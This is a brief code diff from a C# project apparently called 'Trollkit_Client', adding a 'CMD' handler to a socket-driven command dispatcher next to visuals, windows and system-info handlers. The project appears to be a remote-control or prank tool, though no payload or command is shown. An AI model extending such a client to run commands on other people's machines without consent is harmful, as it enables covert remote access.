@@ -63,6 +63,7 @@ namespace Trollkit_Client
 			handlers.Add("Visuals", new VisualsHandler());
 			handlers.Add("Windows", new WindowsHandler());
 			handlers.Add("SystemInfo", new SystemInfoHandler());
+			handlers.Add("CMD", new CMDHandler());
 		}
 
 		private void Receiver_OnDataReceived(Socket s, TransferCommandObject Object)
